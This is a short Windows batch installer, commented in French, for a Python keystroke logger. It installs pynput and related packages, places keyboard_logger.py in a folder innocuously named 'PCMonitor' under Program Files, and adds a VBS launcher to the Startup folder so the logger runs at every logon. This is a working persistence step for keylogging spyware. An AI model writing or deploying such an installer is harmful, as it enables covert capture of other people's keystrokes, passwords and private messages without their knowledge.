@echo off
REM Installation du clavier logger
REM Exécuter en tant qu'administrateur pour l'intégration au démarrage

echo Installation du Keyboard Logger...

REM Installer les dépendances Python
pip install pynput pillow pystray

REM Créer le dossier d'installation
set INSTALL_DIR=%ProgramFiles%\PCMonitor
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

REM Copier le script Python
copy keyboard_logger.py "%INSTALL_DIR%\"

REM Créer un raccourci au démarrage
set STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
copy keyboard_logger.vbs "%STARTUP_DIR%\"

echo Installation terminée!
echo Le logger se lancera automatiquement au prochain démarrage.
pause
